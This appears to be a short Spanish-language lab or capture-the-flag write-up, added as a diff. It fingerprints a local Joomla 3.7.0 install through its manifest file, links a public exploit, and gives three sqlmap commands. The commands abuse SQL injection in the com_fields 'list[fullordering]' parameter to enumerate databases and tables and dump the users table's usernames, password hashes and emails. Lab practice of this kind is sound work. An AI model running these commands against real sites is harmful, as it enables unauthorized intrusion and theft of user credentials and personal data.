@@ -1,0 +1,26 @@
+"Luego de obtener acceso al sistema Joomla, identificamos que se trataba de una instalación estándar. Basándonos en la estructura típica de Joomla, accedimos al archivo de manifiesto del core (joomla.xml) ubicado en /administrator/manifests/files/joomla.xml. Esta es una ubicación por defecto en la mayoría de las instalaciones, y contiene metadatos relevantes como la versión exacta del CMS. La URL fue inferida mediante conocimiento del framework y técnicas básicas de exploración de rutas."
+
+http://localhost:14002/administrator/manifests/files/joomla.xml
+
+
+Buscamos exploit en Joomla 3.7.0
+
+https://www.exploit-db.com/exploits/42033
+
+
+Averiguar bases de datos
+
+sqlmap -u "http://localhost:14002/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
+--risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+Averiguar tablas en joomla
+
+sqlmap -u "http://localhost:14002/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
+--risk=3 --level=5 --random-agent -p list[fullordering] -D joomla --tables
+
+
+Dump de la tabla #__users en joomla
+
+sqlmap -u "http://localhost:14002/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomla -T "#__users" -C id,username,password,email,registerDate --dump
+
